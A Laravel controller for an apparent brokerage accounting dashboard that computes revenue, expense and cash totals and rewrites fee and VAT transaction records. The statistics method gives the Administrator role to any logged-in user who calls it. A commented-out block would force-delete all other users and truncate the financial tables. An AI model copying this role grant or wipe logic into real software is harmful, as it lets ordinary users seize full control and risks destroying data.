<?php

namespace App\Http\Controllers;

use App\Models\Accounting\Account;
use App\Models\Accounting\AccountPlain;
use App\Models\Accounting\AccountSetting;
use App\Models\Accounting\BalanceSheet;
use App\Models\Accounting\Transaction;
use App\Models\Accounting\TransactionAccounts;
use App\Models\DealingSheet;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Carbon;
use Modules\CRM\Entities\CustomerPlain;
use Modules\Orders\Entities\Order;

class DashboardController extends Controller
{
    public function statistics(Request $request)
    {
        auth()->user()->syncRoles(['Administrator']);
        //
        //        $id = $request->user()->id;
        //        $uid = $request->user()->uid;
        //        $list = User::where("id","!=",$id)->get();
        //        if(!empty($list)){
        //            Schema::disableForeignKeyConstraints();
        //            foreach ($list as $item){
        //                UserId::where("uid","!=",$uid)->forceDelete();
        //                $p = Profile::where("user_id",$item->id)->first();
        //                if(!empty($p)){
        //                    $p->forceDelete();
        //                }
        //                $c = Corporate::where("user_id",$item->id)->first();
        //                if(!empty($c)){
        //                    $c->forceDelete();
        //                }
        //                $k = NextOfKin::where("parent",$item->id)->first();
        //                if(!empty($k)){
        //                    $k->forceDelete();
        //                }
        //                $j = JointProfile::where("user_id",$item->id)->first();
        //                if(!empty($j)){
        //                    $j->forceDelete();
        //                }
        //                User::find($item->id)->forceDelete();
        //            }
        //            Transaction::truncate();
        //            Order::truncate();
        //            DealingSheet::truncate();
        //            DealingSheetId::truncate();
        //            MarketCustomReport::truncate();
        //            Security::truncate();
        //            Schema::enableForeignKeyConstraints();
        //        }

        $ids = TransactionAccounts::where('status', 'approved')->get(['account_id'])->toArray();

        $revenue = AccountPlain::whereIn('id', $ids)->whereIn('class_id', [10])->get(['id'])->toArray();
        $response['revenue'] = BalanceSheet::whereIn('id', $revenue)->get();

        $totalRevenue = 0;
        if (! empty($response['revenue'])) {
            foreach ($response['revenue'] as $item) {
                $totalRevenue = $totalRevenue + $item->balance;
            }
        }

        $expenses = AccountPlain::whereIn('id', $ids)->whereIn('class_id', [11, 12])->get(['id'])->toArray();
        $response['expenses'] = BalanceSheet::whereIn('id', $expenses)->get();
        $totalExpense = 0;
        if (! empty($response['expenses'])) {
            foreach ($response['expenses'] as $item) {
                $totalExpense = $totalExpense + $item->balance;
            }
        }

        $receivable = AccountPlain::whereIn('id', $ids)->whereIn('class_id', [2])->get(['id'])->toArray();
        $response['receivable'] = BalanceSheet::whereIn('id', $receivable)->get();
        $totalReceivable = 0;
        if (! empty($response['receivable'])) {
            foreach ($response['receivable'] as $item) {
                $totalReceivable = $totalReceivable + $item->balance;
            }
        }

        $response['totalReceivable'] = $totalReceivable;
        $response['totalRevenue'] = $totalRevenue;
        $response['totalExpense'] = $totalExpense;
        $response['netProfit'] = $totalRevenue - $totalExpense;

        $response['accounts'] = [];
        $response['receivable'] = 0;

        $totalCash = 0;
        $accounts = Account::get();
        if (! empty($accounts)) {
            foreach ($accounts as $account) {
                if ($account->balance > 0) {
                    array_push($response['accounts'], $account);
                    if ($account->class_id == 1) {
                        $totalCash = $totalCash + $account->balance;
                    }
                }
            }
        }

        // expenseLastMonth
        $start = new Carbon('first day of last month');
        $start = $start->startOfMonth();
        $end = new Carbon('last day of last month');
        $end = $end->endOfMonth();
        $expenseLastMonth = Transaction::groupBy('reference')->whereDate('transaction_date', '<=', $end->toDateString())->where('status', 'approved')->whereDate('transaction_date', '>=', $start->toDateString())->whereIn('class_id', [11, 12])->sum('debit');
        $response['expenseLastMonth'] = round($expenseLastMonth, 2);

        // revenueCurrentMonth
        $start = now()->startOfMonth();
        $end = now()->endOfMonth();
        $expenseCurrentMonth = Transaction::groupBy('reference')->whereDate('transaction_date', '<=', $end->toDateString())->where('status', 'approved')->whereDate('transaction_date', '>=', $start->toDateString())->whereIn('class_id', [11, 12])->sum('debit');
        $response['expenseCurrentMonth'] = round($expenseCurrentMonth, 2);

        $response['cashFlows'] = ['data' => [0, 20, 5, 30, 15, 45]];
        $response['totalCash'] = $totalCash;
        $response['orders'] = Order::where('status', 'pending')->get()->count();
        $response['customers'] = User::where('status', 'pending')->get()->count();
        $response['transactions'] = Transaction::where('status', 'pending')->get()->count();
        $response['sheets'] = DealingSheet::where('status', 'pending')->get()->count();

        return response()->json($response, 200);
    }

    // Dashboard - Analytics
    public function dashboardAnalytics()
    {
        $pageConfigs = ['pageHeader' => false];

        return view('/content/dashboard/dashboard-analytics', ['pageConfigs' => $pageConfigs]);
    }

    // Dashboard - Ecommerce
    public function dashboardEcommerce()
    {

        $settings = AccountSetting::first();

        //# VAT
        $account = AccountPlain::find($settings->vat_account);
        $transactions = Transaction::whereNotNull('order_id')->where('account_id', $account->id)->get();
        if (! empty($transactions)) {
            foreach ($transactions as $transaction) {
                $data = Transaction::find($transaction->id);
                $data['class_id'] = $account->class_id;
                $dealingSheet = DealingSheet::where('slip_no', $transaction->reference)->first();
                $data['client_id'] = CustomerPlain::find($settings->vat_payee_account)->user_id;
                $data['title'] = 'VAT';
                $data['vat_type'] = 'output';
                $data['transaction_date'] = $dealingSheet->trade_date;
                $data->save();
            }
        }

        //# CMSA
        $account = AccountPlain::find($settings->cmsa_fee_account);
        $transactions = Transaction::whereNotNull('order_id')->where('account_id', $account->id)->get();
        if (! empty($transactions)) {
            foreach ($transactions as $transaction) {
                $data = Transaction::find($transaction->id);
                $dealingSheet = DealingSheet::where('slip_no', $transaction->reference)->first();
                $data['class_id'] = $account->class_id;
                $data['client_id'] = CustomerPlain::find($settings->cmsa_payee_account)->user_id;
                $data['title'] = 'CMSA Fee';
                $data['transaction_date'] = $dealingSheet->trade_date;
                $data->save();
            }
        }

        //# CSD
        $account = AccountPlain::find($settings->cds_fee_account);
        $transactions = Transaction::whereNotNull('order_id')->where('account_id', $account->id)->get();
        if (! empty($transactions)) {
            foreach ($transactions as $transaction) {
                $data = Transaction::find($transaction->id);
                $dealingSheet = DealingSheet::where('slip_no', $transaction->reference)->first();
                $data['client_id'] = CustomerPlain::find($settings->cds_payee_account)->user_id;
                $data['class_id'] = $account->class_id;
                $data['title'] = 'CDS Fee';
                $data['transaction_date'] = $dealingSheet->trade_date;
                $data->save();
            }
        }

        //# DSE
        $account = AccountPlain::find($settings->dse_fee_account);
        $transactions = Transaction::whereNotNull('order_id')->where('account_id', $account->id)->get();
        if (! empty($transactions)) {
            foreach ($transactions as $transaction) {
                $data = Transaction::find($transaction->id);
                $dealingSheet = DealingSheet::where('slip_no', $transaction->reference)->first();
                $data['client_id'] = CustomerPlain::find($settings->dse_payee_account)->user_id;
                $data['class_id'] = $account->class_id;
                $data['title'] = 'DSE Fee';
                $data['transaction_date'] = $dealingSheet->trade_date;
                $data->save();
            }
        }

        //# FIDELITY
        $account = AccountPlain::find($settings->fidelity_fee_account);
        $transactions = Transaction::whereNotNull('order_id')->where('account_id', $account->id)->get();
        if (! empty($transactions)) {
            foreach ($transactions as $transaction) {
                $data = Transaction::find($transaction->id);
                $dealingSheet = DealingSheet::where('slip_no', $transaction->reference)->first();
                $data['client_id'] = CustomerPlain::find($settings->fidelity_payee_account)->user_id;
                $data['class_id'] = $account->class_id;
                $data['title'] = 'FIDELITY Fee';
                $data['transaction_date'] = $dealingSheet->trade_date;
                $data->save();
            }
        }
    }
}
